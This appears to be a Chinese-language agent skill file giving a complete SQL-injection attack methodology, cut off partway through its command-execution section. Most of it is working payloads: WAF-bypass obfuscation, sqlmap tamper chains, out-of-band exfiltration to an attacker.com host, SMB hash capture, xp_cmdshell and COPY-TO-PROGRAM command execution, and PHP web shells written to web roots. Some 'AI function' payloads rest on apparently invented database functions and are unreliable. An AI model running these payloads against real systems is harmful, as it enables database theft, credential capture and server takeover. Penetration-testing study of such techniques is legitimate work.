---
name: sql-injection-testing
description: SQL注入深度测试专业技能：覆盖全数据库注入面、高级混淆与WAF绕过、分数据库版本定制Payload、AI驱动语义绕过
version: 2.0.0
---

# SQL注入深度测试技能

## 概述

SQL注入是OWASP Top 10长期存在的高危漏洞，现代WAF/IPS通过正则匹配、语义分析、机器学习等多层防护阻断传统Payload。本技能提供**系统化注入点识别→分数据库版本探测→多层级混淆绕过→高级利用→痕迹清理**的完整攻击链，覆盖MySQL/MSSQL/Oracle/PostgreSQL/SQLite五大主流数据库，从传统注入到AI语义绕过的全场景方法论。

## 一、注入点完整攻击面

### 1.1 参数输入面（Input Surface）
| 位置 | 注入场景 | 检测方法 |
|------|---------|---------|
| URL Query参数 | `?id=1&cat=2` | 单引号/闭合测试、布尔差异 |
| POST Body | 表单、JSON、XML | 修改Content-Type、参数污染 |
| HTTP Headers | User-Agent、Referer、X-Forwarded-For、Cookie | 修改头值注入、日志投毒场景 |
| Cookie值 | session id、user_id、token | 解码后注入、分块注入 |
| RESTful Path | `/user/1/profile` → `/user/1' AND 1=1--/profile` | 路径注入、路径参数污染 |
| JSON字段 | `{"id":1}` → `{"id":"1' AND SLEEP(5)--"}` | 类型混淆（int→string） |
| XML/Soap | XML实体+SQL拼接 | XXE+SQLi组合攻击 |
| 二阶注入 | 注册用户名`admin'--`，后续查询触发 | 持久化数据二次利用 |
| HTTP方法 | `GET/POST/PUT/PATCH/DELETE` | 方法变换、OPTIONS探测 |
| 多参数组合 | `?a=1&b=2` → `a=1'/*&b=*/AND 1=1--` | 参数拆分、注释拼接注入 |

### 1.2 注入类型分类
- **Union注入**：联合查询回显
- **Boolean盲注**：真假条件差异
- **Time-based盲注**：时间延迟差异
- **Error-based报错注入**：数据库错误回显
- **Stacked queries堆叠注入**：多语句执行
- **Second-order二阶注入**：存储后触发
- **Out-of-band外带注入**：DNS/HTTP外带数据
- **Wide-Byte宽字节注入**：GBK等编码绕过`addslashes`
- **HTTP Parameter Pollution参数污染**：多同名字段绕过
- **NoSQL注入**：MongoDB/Redis等非关系型

### 1.3 闭合类型识别
```
数字型: id=1 AND 1=1--
单引号字符串: id=1' AND '1'='1
双引号字符串: id=1" AND "1"="1
括号型: id=1') AND ('1'='1 / id=1") AND ("1"="1
LIKE型: keyword=x%' AND SLEEP(5)--%'
```

## 二、数据库指纹深度识别

### 2.1 版本特征探测
```sql
-- MySQL版本细分
MySQL 5.0/5.1: @@version_comment LIKE '%MySQL%' AND VERSION() LIKE '5.0%'
MySQL 5.5/5.6: @@innodb_version LIKE '5.5%' / TO_SECONDS(NOW())可用
MySQL 5.7: JSON_EXTRACT/JSON_OBJECT/SYS库可用
MySQL 8.0: WITH RECURSIVE/CTE/窗口函数/REGEXP_REPLACE/TABLE语句可用

-- MSSQL版本细分
MSSQL 2000: TEXTPTR/READTEXT/SYSOBJECTS
MSSQL 2005: XML路径/CTE/SYS.TABLES
MSSQL 2008: FOR XML PATH/AUTO
MSSQL 2012: IIF/CHOOSE/LEAD/LAG
MSSQL 2016: OPENJSON/JSON_VALUE/STRING_SPLIT
MSSQL 2017: TRANSLATE/TRIM/STRING_AGG
MSSQL 2019: APPROX_COUNT_DISTINCT/智能查询处理/UTF8排序规则
MSSQL 2022: GENERATE_SERIES/ISJSON增强
MSSQL 2025: AI_PREDICT/VECTOR_DISTANCE（模拟AI函数语义绕过）

-- Oracle版本细分
Oracle 11g: XMLType/EXTRACTVALUE/NUMTOYMINTERVAL延迟
Oracle 12c: JSON_VALUE/多租户V$PDBS/私有临时表
Oracle 18c/19c: JSON_SERIALIZE/LISTAGG SQL Macros/多态表函数
Oracle 21c: 原生JSON类型/模拟DBMS_PYTHON
Oracle 23ai: AI_SQL_GENERATE/VECTOR_DISTANCE/向量语义查询

-- PostgreSQL: VERSION() LIKE '%PostgreSQL%' / pg_sleep() / current_database()
-- SQLite: sqlite_version() / randomblob()
```

### 2.2 快速指纹Payload
```sql
-- 通用
' AND @@version IS NOT NULL--           → MySQL/MSSQL
' AND version() IS NOT NULL--            → PostgreSQL/MySQL
' AND (SELECT COUNT(*) FROM v$version)>0-- → Oracle
' AND sqlite_version() IS NOT NULL--     → SQLite

-- 细分（无需UNION）
' AND LENGTH(@@version)>0--              → MySQL/MSSQL
' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE 'Oracle%'--
' AND TO_SECONDS(NOW())>0--              → MySQL 5.5+
' AND JSON_EXTRACT('{}','$.a') IS NULL-- → MySQL 5.7+/Pg 9.3+
' AND OPENJSON('{}') IS NOT NULL--       → MSSQL 2016+
' WITH cte AS (SELECT 1) SELECT*FROM cte-- → MySQL 8.0/MSSQL 2005+
```

## 三、核心注入技术（分类型）

### 3.1 Union注入
**列数确定**：
```sql
' ORDER BY 1--     ' ORDER BY 10--     （二分法）
' UNION SELECT NULL--                   ' UNION SELECT NULL,NULL--
' UNION SELECT 1,2,3,4--                （数字占位确定回显位）
```

**无逗号注入**：
```sql
-- 用JOIN代替逗号
' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--
-- LIMIT无逗号
' LIMIT 1 OFFSET 0--
```

### 3.2 Boolean盲注
```sql
-- 基础
' AND (SELECT SUBSTRING(VERSION(),1,1))='5'--
' AND (SELECT ASCII(SUBSTRING(VERSION(),1,1)))=53--

-- 无SUBSTRING（MySQL）
' AND MID(VERSION(),1,1)='5'--
' AND LEFT(VERSION(),1)='5'--
' AND ORD(MID(VERSION(),1,1))=53--

-- 用正则替代等号
' AND VERSION() REGEXP '^5'--
' AND VERSION() LIKE '5%'--

-- MSSQL替代
' AND SUBSTRING(VERSION(),1,1)='5'--
' AND ASCII(SUBSTRING(@@VERSION,1,1))=77--   (M开头为Microsoft)
' AND DATALENGTH(DB_NAME())>4--              (替代LEN)
' AND COALESCE(NULL,1)=1--                   (替代ISNULL)

-- Oracle
' AND SUBSTR(USER,1,1)='S'--
' AND ASCII(SUBSTR(USER,1,1))=83--
' AND USER LIKE 'SYS%'--
```

### 3.3 Time-based盲注
```sql
-- MySQL
' AND SLEEP(5)--
' AND (SELECT SLEEP(5) FROM dual)--
' AND IF(1=1,SLEEP(5),0)--
' AND BENCHMARK(10000000,SHA1('test'))--     (CPU繁忙型延迟)
-- MySQL 5.5+
' AND (SELECT TO_SECONDS(NOW())+5=TO_SECONDS(SLEEP(5)+NOW()))--
' AND GET_LOCK('test',5)--                    (MySQL 5.7+)
-- MySQL 8.0高级
' AND (SELECT ROW_NUMBER() OVER (ORDER BY (SELECT 1 WHERE 1=1 AND SLEEP(5))))--

-- MSSQL
' WAITFOR DELAY '0:0:5'--
' IF (1=1) WAITFOR DELAY '0:0:5'--

-- Oracle (无原生SLEEP，使用以下方案)
' AND DBMS_LOCK.SLEEP(5)--                    (需要权限)
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--    (PUBLIC权限可用)
' AND (SELECT COUNT(*) FROM ALL_OBJECTS WHERE ROWNUM<=10000000)>0-- (重型查询延迟)
' AND NUMTOYMINTERVAL(5,'MONTH') IS NOT NULL-- (11g+)
' AND UTL_HTTP.REQUEST('http://attacker.com') IS NOT NULL-- (HTTP外带)

-- PostgreSQL
' AND PG_SLEEP(5)--
' AND (SELECT COUNT(*) FROM GENERATE_SERIES(1,10000000))>0--

-- SQLite
' AND (SELECT COUNT(*) FROM sqlite_master WHERE randomblob(1000000000))--
```

### 3.4 Error-based报错注入
```sql
-- MySQL (XPath/几何对象/主键重复)
' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))--
' AND UPDATEXML(1,CONCAT(0x7e,VERSION(),0x7e),1)--
' AND (SELECT * FROM (SELECT NAME_CONST(VERSION(),1),NAME_CONST(VERSION(),1))a)--
' AND EXP(~(SELECT * FROM (SELECT USER())a))--
' AND GTID_SUBSET(CONCAT(0x7e,VERSION(),0x7e),1)--   (5.6+)
' AND JSON_EXTRACT('{"a":1}',CONCAT('$.',VERSION()))-- (5.7+)
' AND ST_LatFromGeoHash(VERSION())--                   (5.7+)
' AND ST_PointFromGeoHash(VERSION(),1)--               (5.7+)

-- MSSQL (类型转换错误)
' AND CONVERT(INT,(SELECT TOP 1 DB_NAME()))--
' AND CAST((SELECT TOP 1 DB_NAME()) AS INT)--
' AND 1=CTXTS_DOC.PARSE('a')--                          (全文检索)
' AND (SELECT * FROM OPENROWSET('SQLoledb','server';'sa';'pass','SELECT 1'))-- (错误链)
-- MSSQL 2016+ JSON报错
' AND (SELECT 1 FROM OPENJSON(CONCAT('["',@@VERSION,'"]')))--

-- Oracle (类型转换错误)
' AND CTXSYS.DRITHSX.SN(1,(SELECT USER FROM DUAL))--
' AND UTL_INADDR.GET_HOST_NAME((SELECT USER FROM DUAL))--
' AND (SELECT CTX_REPORT.TOKEN_TYPE(USER,1) FROM DUAL)--
' AND SYS.DBMS_AQADM.MOVE_QUEUE_TABLE(USER,1)--
-- 11g XMLType报错
' AND (SELECT XMLType('<a>'||USER||'</a>') FROM DUAL)--
-- 12c+ JSON报错
' AND (SELECT JSON_VALUE('{"a":"'||USER||'"}','$.a') FROM DUAL)--

-- PostgreSQL
' AND 1=CAST(VERSION() AS INT)--
' AND (SELECT 1 FROM PG_EXPANDARRAY(('{'||CURRENT_USER||'}')::TEXT[]))--
' AND (SELECT COUNT(*) FROM GENERATE_SERIES(1,1) WHERE CAST(VERSION() AS INT)=1)--

-- SQLite
' AND (SELECT 1 FROM (SELECT 1 UNION SELECT 2) GROUP BY 1 HAVING 1=1)--
' AND CAST(HEX(RANDOMBLOB(1000000000)) AS INTEGER)--
```

### 3.5 Out-of-Band外带注入（盲注替代）
```sql
-- DNS外带（最通用）
-- MySQL
' AND LOAD_FILE(CONCAT('\\\\',(SELECT VERSION()),'.attacker.com\\a'))--
-- MSSQL
'; EXEC master..xp_dirtree '\\'+@@VERSION+'.attacker.com\a'--
'; DECLARE @a VARCHAR(1024);SET @a=@@VERSION;EXEC('master..xp_dirtree "\\'+@a+'.attacker.com\a"')--
-- Oracle
' AND UTL_HTTP.REQUEST('http://'||USER||'.attacker.com/') IS NOT NULL--
' AND UTL_INADDR.GET_HOST_ADDRESS(USER||'.attacker.com') IS NOT NULL--
' AND DBMS_LDAP.INIT((SELECT USER FROM DUAL)||'.attacker.com',80) IS NOT NULL--

-- HTTP外带
-- MySQL（需FILE权限）
' AND (SELECT LOAD_FILE(CONCAT('\\\\',VERSION(),'.attacker.com\\a')))--
-- MSSQL OLE Automation
'; DECLARE @o INT;EXEC sp_oacreate 'MSXML2.ServerXMLHTTP',@o OUT;EXEC sp_oamethod @o,'open',null,'GET','http://attacker.com/?d='+@@VERSION;EXEC sp_oamethod @o,'send'--

-- SMB哈希捕获（Responder）
-- MSSQL：强制SMB认证获取NetNTLM Hash
'; EXEC master..xp_dirtree '\\attacker.com\share'--
'; EXEC master..xp_fileexist '\\attacker.com\share'--
```

### 3.6 堆叠注入（Stacked Queries）
```sql
-- MSSQL（默认支持多语句）
'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;--
'; EXEC xp_cmdshell 'whoami'--
'; INSERT INTO users(username,password) VALUES('hacker','p@ss')--

-- MySQL（需multi_statements=on，PHP默认PDO支持/mysqli需指定）
'; INSERT INTO users VALUES('hacker','p@ss');--

-- PostgreSQL
'; COPY (SELECT '') TO PROGRAM 'whoami';--
'; CREATE TABLE cmd(out text);COPY cmd FROM PROGRAM 'id';--
```

### 3.7 宽字节注入
```sql
%bf%27  →  %bf%5c%27（MySQL GBK中%bf%5c为合法宽字符"縗"，%27逃逸）
%df%27  →  運'
%aa%27  →  使用不同高位字节（0x81-0xFE）测试
-- 典型场景：PHP addslashes()/magic_quotes_gpc + GBK编码
%df' OR 1=1--
```

## 四、WAF深度绕过方法论

### 4.1 绕过层级模型
```
Layer 1: 编码层（URL/Unicode/Base64/Hex）
Layer 2: 注释层（内联注释/版本注释/垃圾注释/注释拼接）
Layer 3: 空白符层（空格替代/Tab/换行/括号/特殊空白）
Layer 4: 关键字混淆层（大小写/内联注释插字符/等价函数/同义词）
Layer 5: 语法变形层（等价语法重写/CTE/子查询/JSON包装）
Layer 6: 协议层（HPP/分块编码/长content/畸形请求）
Layer 7: 语义层（AI函数包装/向量语义近似/自然语言转SQL）
```

### 4.2 空白符替换大全
```
-- 空格替代字符（各数据库支持情况）
MySQL:  /**/  %09  %0a  %0b  %0c  %0d  %a0  +  /*!*/  /*x*/  ()
MSSQL:  /**/  %09  %0a  %0d  %0b  ()
Oracle: /**/  %0a  %0d  %09  ()  换行  CHR(9)/CHR(10)/CHR(13)
PostgreSQL: /**/  %09  %0a  %0d  --\n

-- 示例
'/**/AND/**/1=1--
'%0aAND%0a1=1--
'%09AND%091=1--
'()AND()1=1--                         (MySQL空括号代替空格)
'/*comment*/AND/*comment*/1=1--
```

### 4.3 注释绕过技术
```sql
-- MySQL版本注释
'/*!UNION*//*!SELECT*/1,2,3--          (MySQL专属，/*!*/之间MySQL执行，其他数据库当注释)
'/*!50000UNION*//*!50000SELECT*/1,2--  (版本号条件执行，MySQL>=5.00.00执行)

-- 随机垃圾注释
'/**/UN/**/ION/**/SEL/**/ECT/**/1,2--  (中间插注释拆分关键字)
'/^!UNION^/SELECT/1,2--                (利用特殊符号当注释)
'/*anything*/AND/*foo*/1=1--

-- MSSQL行内注释
'--\nAND--\n1=1--
';--comment\nEXEC--\nxp_cmdshell--

-- Oracle/+ Hint/ 注释
'/*+ ALL_ROWS */ UNION SELECT 1,2 FROM DUAL--
'/*+ CHOOSE */ UNION SELECT USER FROM DUAL--

-- 注释结尾混淆
'UNION SELECT 1,2,3--+                 (+替代空格)
'UNION SELECT 1,2,3#                   (MySQL#注释)
'UNION SELECT 1,2,3;%00                (空字节截断后续)
```

### 4.4 关键字混淆与等价替换
**AND/OR替换：**
```sql
-- 逻辑运算符
AND  →  &&           (MySQL)
OR   →  ||
NOT  →  !

-- MSSQL/通用
AND  →  %26%26       (URL编码&&)
OR   →  %7c%7c
NOT  →  %21

-- 双关键字抵消
' AND 1=1 AND '1'='1  →  ' AANDND 1=1--   (如果WAF删除AND一次，残留AND)
' UNUNIONION SELECT--  (双写绕过删除型WAF)
```

**UNION/SELECT/FROM替换：**
```sql
-- MySQL内联注释
' /*!50000UNION*/ /*!50000SELECT*/ 1,2--

-- MSSQL变体
' UNION/**/ALL/**/SELECT 1,2--          (UNION ALL替代UNION)
' UNION ALL SELECT DISTINCT 1,2--
' INTO OUTFILE 替代写文件

-- Oracle同义词
' UNION SELECT USER FROM "DUAL"--       (双引号包裹标识符)
' UNION SELECT 1 FROM SYS.DUAL--
' UNION SELECT 1 FROM "SYS"."DUAL"--

-- MySQL 8.0+ TABLE语句替代SELECT * FROM
' UNION TABLE users--
```

**等号/比较符替换：**
```sql
=     →  LIKE                  ' AND 1 LIKE 1--
=     →  BETWEEN..AND..        ' AND 1 BETWEEN 1 AND 1--
=     →  IN (1)                ' AND 1 IN (1)--
=     →  REGEXP '^1$'          ' AND 1 REGEXP '^1$'--
=     →  <> 取反双重否定       ' AND NOT 1<>1--
>     →  NOT BETWEEN 0 AND N   ' AND 1 NOT BETWEEN 0 AND 2--
<     →  BETWEEN 0 AND N-1     ' AND 1 BETWEEN 0 AND 1--
空格+→  GREATEST(1,2)=2        ' AND GREATEST(1,2)=2--
空格<→  LEAST(1,2)=1

-- 科学计数法（绕过数字匹配）
' AND 1=1--           →  ' AND 1e0=1--
' LIMIT 1,1--         →  ' LIMIT 1.0,1.0--
' LIMIT 0,1--         →  ' LIMIT 0x1,0x1--    (十六进制)
```

**逗号绕过：**
```sql
-- UNION中无逗号
' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--
' UNION SELECT * FROM (SELECT 1)a,(SELECT 2)b,(SELECT 3)c--

-- LIMIT无逗号
' LIMIT 1 OFFSET 0--

-- SUBSTRING无逗号（JOIN法）
' AND (SELECT 1 FROM (SELECT SUBSTR(VERSION(),1,1))a)='5'--

-- MID/SUBSTR参数用JOIN拆
' UNION SELECT 1,2,3 FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--
```

### 4.5 字符串/函数混淆
**字符串表示（无引号）：**
```sql
-- MySQL十六进制
' AND 0x41444D494E='ADMIN'--
' AND USER()=0x726F6F74406C6F63616C686F7374--

-- MySQL CHAR()函数
' AND CHAR(65,68,77,73,78)='ADMIN'--
' AND CONCAT(CHAR(65),CHAR(68))='AD'--

-- MSSQL
' AND CHAR(65)+CHAR(68)='AD'--
' AND 0x4144='AD'--

-- Oracle CHR()
' AND CHR(65)||CHR(68)='AD'--

-- PostgreSQL
' AND CHR(65)||CHR(68)='AD'--
' AND E'\x41\x44'='AD'--
```

**函数名变形：**
```sql
-- MySQL
VERSION()         →  @@version / @@global.version / VERSION/**/()
DATABASE()        →  DATABASE/**/() / SCHEMA()
USER()            →  CURRENT_USER / CURRENT_USER() / SYSTEM_USER() / SESSION_USER()
SUBSTRING()       →  MID() / SUBSTR() / LEFT()/RIGHT()
ASCII()           →  ORD() / ASCII()
LENGTH()          →  LENGTH() / CHAR_LENGTH() / OCTET_LENGTH()

-- MSSQL
LEN()             →  DATALENGTH()
GETDATE()         →  SYSDATETIME() / GETUTCDATE()
ISNULL()          →  COALESCE()
SUSER_NAME()      →  SYSTEM_USER / CURRENT_USER / USER_NAME()

-- Oracle
SUBSTR()          →  SUBSTRB() / SUBSTRC() / DBMS_LOB.SUBSTR()
LENGTH()          →  LENGTHB() / DBMS_LOB.GETLENGTH()
```

### 4.6 高级编码绕过
```sql
-- URL多层编码
原始: ' UNION SELECT 1,2--
一层URL: %27%20UNION%20SELECT%201%2c2--
二层URL: %2527%2520UNION%2520SELECT%25201%252c2--
Unicode: %u0027%u0020UNION%u0020SELECT%u00201%u002c2--

-- 双重URL编码绕WAF
%2527  → WAF解码一次得到%27放行 → 后端再次解码得到'

-- HTML实体
&#39; → '   &#x27; → '   &apos; → '

-- Base64/自定义编码（若后端有decoder）
'; DECLARE @a VARCHAR(8000);SET @a=CAST(0x554E494F4E2053454C454354 AS VARCHAR(8000));EXEC(@a)--

-- 双重编码
' AND 1=CONVERT(INT,(SELECT DB_NAME()))--   (MSSQL十六进制编码EXEC)
```

### 4.7 HPP（HTTP参数污染）
```http
?a=1&a=2' AND SLEEP(5)--&a=3
-- WAF可能只取第一个a=1，后端取最后一个或拼接
?id=1&id=1' UNION SELECT 1,2--
?name=admin'/*&pass=*/AND 1=1--            (跨参数注释拼接)
```

### 4.8 协议层绕过
```http
-- Transfer-Encoding: chunked（绕WAF内容检测）
POST /login HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

5
UNION
6
 SELEC
4
T 1,
2
2--
0

-- Content-Length溢出/畸形
Content-Length: 0（Content-Length伪造为0，后端读全量）

-- 超长无意义Content-Type前缀
Content-Type: aaaaaaaaaaaa...(2000个a)...application/x-www-form-urlencoded

-- 分块+超长前缀
-- 多Content-Type头
```

### 4.9 分数据库版本高级绕过（ByPassTamperPlus技术）

**MySQL 5.7+ JSON函数混淆：**
```sql
-- INFORMATION_SCHEMA替换为SYS库
' AND (SELECT JSON_EXTRACT(JSON_OBJECT('a',(SELECT GROUP_CONCAT(table_name) FROM sys.schema_table_statistics)),'$.a'))--
' AND (SELECT JSON_EXTRACT(CONCAT(0x7b2261223a,HEX((SELECT GROUP_CONCAT(table_name) FROM sys.schema_table_statistics)),0x7d),0x242e61))--

-- JSON_ARRAYAGG替代GROUP_CONCAT
' AND (SELECT JSON_ARRAYAGG(CONCAT(table_name,0x3a,column_name)) FROM sys.schema_object_overview)--

-- SYS库视图替换INFORMATION_SCHEMA
INFORMATION_SCHEMA.TABLES  →  sys.schema_table_statistics / sys.x$schema_flattened_keys
INFORMATION_SCHEMA.COLUMNS →  sys.schema_object_overview / sys.x$ps_schema_table_statistics_io
```

**MySQL 8.0 CTE+窗口函数语法变形：**
```sql
-- SELECT包装为CTE
' WITH cte AS (SELECT 1,VERSION()) SELECT * FROM cte--

-- SLEEP用窗口函数包装（绕关键字检测）
' AND (SELECT ROW_NUMBER() OVER (ORDER BY (SELECT 1 WHERE 1=1 AND SLEEP(5))))--

-- TABLE语句（MySQL 8.0.19+）
' UNION TABLE information_schema.tables--

-- REGEXP_REPLACE字符串拆分
' AND REGEXP_REPLACE(CONCAT(0x61,0x64),0x61,0x61)='ad'--
```

**MSSQL 2016+ OPENJSON/JSON_VALUE：**
```sql
-- 数据提取用JSON函数包装
' AND (SELECT TOP 1 CAST(JSON_VALUE('{"a":"'+@@version+'"}','$.a') AS INT))--

-- OPENJSON替代传统查询
' AND (SELECT [value] FROM OPENJSON((SELECT * FROM (SELECT 1 a,@@version b)t FOR JSON PATH)))--

-- 2019+ APPROX_COUNT_DISTINCT
' AND APPROX_COUNT_DISTINCT(CASE WHEN IS_SRVROLEMEMBER('sysadmin')=1 THEN USER_NAME() END)>0--

-- UTF8排序规则（COLLATE）变形
' AND 1=(SELECT TOP 1 name COLLATE Latin1_General_100_CI_AS_SC_UTF8 FROM sys.columns)--

-- OPENROWSET ODBC命令执行绕过
' AND (SELECT * FROM OPENROWSET('ODBC','Driver={cmd};Command=whoami',''))--
```

**MSSQL 2025（AI_PREDICT/VECTOR_DISTANCE模拟）：**
```sql
-- 利用AI相关函数（若支持）做语义近似比较
' AND VECTOR_DISTANCE(VECTOR_EMBEDDING('admin'),VECTOR_EMBEDDING(username),COSINE)<0.1--
' AND AI_PREDICT('is admin?',username)=1--
```

**Oracle 23ai AI_SQL_GENERATE/VECTOR语义：**
```sql
-- 自然语言生成SQL（若该函数可用）
' AND 1=(SELECT AI_SQL_GENERATE('Show me the current database user') FROM DUAL)--

-- 向量相似度绕过传统等值比较
' AND VECTOR_DISTANCE(VECTOR_EMBEDDING(username),VECTOR_EMBEDDING('ADMIN'),COSINE)<0.1--

-- 双引号标识符包裹
' AND "USER"=(SELECT "USER" FROM "DUAL")--

-- CHR拼接（无引号）
' AND USER=CHR(83)||CHR(89)||CHR(83)--
```

## 五、sqlmap高级Tamper组合使用

### 5.1 标准Tamper分类与选型
| Tamper脚本 | 功能 | 适用场景 |
|-----------|------|---------|
| `space2comment` | 空格→/**/ | 通用弱WAF |
| `space2hash` | 空格→%23%0a（MySQL） | MySQL WAF |
| `space2mssqlblank` | 空格→随机空白（MSSQL） | MSSQL |
| `space2mysqlblank` | 空格→随机空白（MySQL） | MySQL |
| `space2randomblank` | 空格→随机空白 | 通用 |
| `randomcase` | 关键字随机大小写 | 大小写敏感过滤 |
| `between` | >/=→BETWEEN | 拦截比较符 |
| `equaltolike` | =→LIKE | 拦截等号 |
| `charencode` | 全URL编码 | URL层过滤 |
| `percentage` | 每个字符前加% | ASP/IIS |
| `chardoubleencode` | 双重URL编码 | 双层WAF |
| `charunicodeencode` | Unicode编码 | ASP/ASP.NET |
| `charunicodeescape` | Unicode转义 | 通用 |
| `appendnullbyte` | 末尾加%00 | Access截断 |
| `ifnull2ifisnull` | IFNULL→IF(ISNULL) | 过滤IFNULL |
| `modsecurityversioned` | MySQL版本注释包裹 | ModSecurity |
| `modsecurityzeroversioned` | /*!00000*/包裹 | ModSecurity |
| `versionedkeywords` | /*!...*/包裹关键字 | 通用MySQL WAF |
| `versionedmorekeywords` | 更多关键字版本注释 | 强MySQL WAF |
| `halfversionedmorekeywords` | 关键字前置版本注释 | 变种 |
| `bluecoat` | 空格→随机空白+随机注释 | BlueCoat WAF |
| `varnish` | 绕过Varnish缓存WAF | Varnish |
| `xforwardedfor` | 添加X-Forwarded-For头 | 基于IP白名单 |
| `informationschemacomment` | i_s加/**/注释 | 拦截i_s |
| `sleep2getlock` | SLEEP→GET_LOCK | 拦截SLEEP |
| `greatest/least` | >/<→GREATEST/LEAST | 拦截比较符 |
| `apostrophemask` | '→%EF%BC%87 | UTF-8全角撇号 |
| `apostrophenullencode` | '→%00%27 | 空字节撇号 |
| `overlongutf8/overlongutf8more` | UTF-8超长编码 | 超长编码绕过 |
| `concat2concatws` | CONCAT→CONCAT_WS | 拦截CONCAT |
| `substring2leftright` | SUBSTRING→LEFT/RIGHT | 拦截SUBSTRING |
| `0eunion` | UNION→e0UNION（e0科学计数法前缀） | 拦截UNION |
| `dunion/misunion` | UNION变体拼接 | 强UNION拦截 |
| `sp_password` | 追加sp_password日志绕过 | MSSQL日志屏蔽 |
| `plus2concat/plus2fnconcat` | +→CONCAT/|| | MSSQL拦截+ |
| `commalesslimit/commalessmid` | 无逗号LIMIT/MID | 拦截逗号 |
| `commentbeforeparentheses` | 括号前加注释 | 括号前拦截 |
| `ord2ascii` | ORD→ASCII | 拦截ORD |
| `symboliclogical` | AND/OR→&&/|| | 拦截AND/OR |
| `hex2char` | 0x→CHAR() | 拦截十六进制 |
| `if2casewhenisnull` | IF→CASE WHEN | 拦截IF |
| `unionalltounion` | UNION ALL→UNION | 拦截UNION ALL |
| `escapequotes` | '→\\' | 魔术引号 |
| `base64encode` | Base64编码 | 后端有解码 |
| `unmagicquotes` | 宽字节绕过魔术引号 | GBK+addslashes |
| `multiplespaces` | 单空格→多空格 | 单空格匹配 |
| `randomcomments` | 关键字内插随机注释 | 强关键字拦截 |
| `hexentities` | 十六进制→HTML实体 | HTML实体场景 |
| `htmlencode/decentities` | HTML编码/反实体 | HTML层过滤 |
| `binary` | 加BINARY关键字 | BINARY比较 |
| `schemasplit` | information_schema拆分 | i_s拆分拦截 |
| `scientific` | 数字→科学计数法 | 数字过滤 |
| `lowercase/uppercase` | 关键字大/小写统一 | 大小写混合 |
| `luanginx/luanginxmore` | 绕过LUA/Nginx WAF | Nginx+Lua WAF |
| `ifnull2casewhenisnull` | IFNULL→CASE WHEN IS NULL | 过滤IFNULL |

### 5.2 推荐Tamper组合（按WAF类型）
```bash
# 1. 基础WAF（阿里云/腾讯云基础版）
--tamper=space2comment,randomcase,between

# 2. 中等防护（ModSecurity/云WAF标准版）
--tamper=space2comment,randomcase,between,modsecurityversioned,charencode

# 3. 强防护（安全狗/D盾/云锁）
--tamper=space2comment,space2randomblank,randomcomments,randomcase,versionedmorekeywords,between,equaltolike,charencode

# 4. MySQL强WAF（阿里云企业版/长亭雷池）
--tamper=space2mysqlblank,randomcomments,versionedmorekeywords,halfversionedmorekeywords,if2casewhenisnull,sleep2getlock,between,greatest,concat2concatws,chardoubleencode

# 5. MSSQL强WAF
--tamper=space2mssqlblank,randomcase,randomcomments,percentage,charunicodeencode,equaltolike,appendnullbyte

# 6. Oracle
--tamper=space2comment,randomcase,between,commentbeforeparentheses,greatest,least

# 7. 宽字节（GBK场景）
--tamper=unmagicquotes,space2comment,randomcase

# 8. MSSQL蓝盾/BlueCoat
--tamper=bluecoat,space2mssqlhash,charunicodeencode

# 9. Varnish缓存WAF
--tamper=varnish,space2comment,randomcase

# 10. 分块编码绕过（配HTTP头）
--chunked  --tamper=randomcomments,space2comment
```

### 5.3 sqlmap高阶参数
```bash
# 基础扫描
sqlmap -u "http://target.com/page?id=1" --batch --random-agent

# WAF绕过全套
sqlmap -u "http://target/page?id=1" \
  --tamper=space2comment,randomcase,between,randomcomments \
  --random-agent --delay=1 --timeout=30 --retries=3 \
  --skip-waf --hpp --chunked --no-cast \
  --eval="import hashlib;id=hashlib.md5(id.encode()).hexdigest()"

# 分数据库指定
sqlmap -u "URL" --dbms=mysql --tech=BEUSTQ --level=5 --risk=3
sqlmap -u "URL" --dbms=mssql --tech=ES --os=Windows --banner
sqlmap -u "URL" --dbms=oracle --tech=BEUST --level=5

# DNS外带（--dns-domain需自己控制DNS服务器）
sqlmap -u "URL" --dns-domain=attacker.com --technique=T

# 二阶注入
sqlmap -u "second_order_url" --second-order="trigger_url" --second-req="request.txt"

# 代理多跳
--proxy="http://127.0.0.1:8080" --proxy-cred="user:pass" --tor --tor-port=9050 --tor-type=SOCKS5

# 绕过401认证
--auth-type=basic --auth-cred="admin:admin"
```

## 六、高级利用场景

### 6.1 文件读写
```sql
-- MySQL读文件（需FILE权限 + secure_file_priv为空）
' UNION SELECT LOAD_FILE('/etc/passwd')--
' UNION SELECT LOAD_FILE(0x2f6574632f706173737764)--  (十六进制路径无引号)

-- MySQL写文件
' UNION SELECT '<?php @eval($_POST[cmd]);?>' INTO OUTFILE '/var/www/html/shell.php'--
' UNION SELECT '<?php @eval($_POST[cmd]);?>' INTO DUMPFILE '/var/www/html/shell.php'--
-- General Log写Shell
'; SET GLOBAL general_log='ON';SET GLOBAL general_log_file='/var/www/html/shell.php';--
'; SELECT '<?php @eval($_POST[cmd]);?>';--
-- Slow Query Log写Shell
'; SET GLOBAL slow_query_log=1;SET GLOBAL slow_query_log_file='/var/www/html/shell.php';--
'; SELECT '<?php @eval($_POST[cmd]);?>' OR SLEEP(11);--

-- MSSQL文件操作（启用xp_cmdshell后）
'; EXEC xp_cmdshell 'echo ^<?php @eval($_POST[cmd]);?^> > C:\\inetpub\\wwwroot\\shell.php'--
-- BULK INSERT读文件
'; CREATE TABLE tt(t varchar(8000));BULK INSERT tt FROM 'c:\\windows\\win.ini';SELECT * FROM tt;DROP TABLE tt--

-- Oracle文件读写（需UTL_FILE/DBA权限）
'; DECLARE f UTL_FILE.FILE_TYPE;BEGIN f:=UTL_FILE.FOPEN('C:\','shell.php','W');UTL_FILE.PUT_LINE(f,'<%execute(request("cmd"))%>');UTL_FILE.FCLOSE(f);END;--
```

### 6.2 命令执行
```sql
-- MSSQL xp_cmdshell
'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;--
'; EXEC xp_cmdshell 'whoami'--
-- 注册表CLR绕过xp_cmdshell禁用
